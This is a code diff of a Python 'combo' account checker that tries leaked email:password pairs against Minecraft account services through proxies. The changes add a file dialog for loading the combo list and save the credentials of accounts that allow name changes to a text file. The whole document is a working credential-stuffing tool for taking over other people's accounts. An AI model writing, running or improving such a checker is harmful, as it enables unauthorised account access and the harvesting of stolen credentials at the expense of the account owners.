@@ -1,19 +1,31 @@
+import tkinter
 import requests
 from requests.api import head, request
 import os
 from colorama import init, Style, Fore
 from datetime import datetime
+import time
+from tkinter import filedialog
 init()
 AccountsChecked = 0
 Hits = 0
 failedToLogin = True
 debugmode = False # Warning! Enabling This Will Expose Your Auth Keys, Tokens are Other Sensitive Info in the Console. Because of this, it is recommended you leave this off for normal usage.
 token = ''
+root = tkinter.Tk()
+root.withdraw()
+def openFile():
+    global filepath
+    filepath = filedialog.askopenfile()
+
 os.system(f"title "+f"Backpack Checker V1.5 l Hits: {Hits}")
 with open('.\\valid.txt', 'w+') as f:
     f.truncate()
 failedToLogin = False
 canlogin = []
+
+print(f"{Fore.GREEN}Open Your Combos File...")
+
 
 if os.path.getsize('.\\accounts.txt') > 0:
     pass
@@ -53,6 +65,7 @@ def accessToken(proxy):
         AccountsChecked = AccountsChecked+1
         failedToLogin = True
         print(f"{Fore.RED}[FAIL]{Style.RESET_ALL} | Failed to login to {email}")
+        print(AccountsChecked)
         if debugmode == True:
             print(response_json)
         pass
@@ -77,6 +90,8 @@ def checkNameChange(proxy):
     r = requests.get("https://api.minecraftservices.com/minecraft/profile/namechange", headers=headers, proxies={'http' : f'{proxy}'})
     if failedToLogin != True:
         if r.json()['nameChangeAllowed'] == True:
+            with open("cannamechange.txt", "w+") as f:
+                f.write(f"{email}:{password}")
             namechange = True
             if debugmode == True:
                 print(r.json())
@@ -117,7 +132,8 @@ def checkAccountType(proxy):
 
 
 # Main bit lol
-with open('.\\accounts.txt', 'r') as f:
+openFile()
+with open(filepath.name, 'r') as f:
     proxynum = 0
     for line in f:
         email, password = line.split(':')
@@ -165,6 +181,7 @@ with open('.\\accounts.txt', 'r') as f:
                     checkAccountType('http://' + lineproxy + '/')
                 except:
                     pass
+                print(AccountsChecked)
                 if failedToLogin == False:
                     print(f"""
     Account Type: {accountType}
@@ -181,3 +198,5 @@ with open('.\\accounts.txt', 'r') as f:
             else:
                 pass
 print(f'Finished!')
+while True:
+    time.sleep(1)
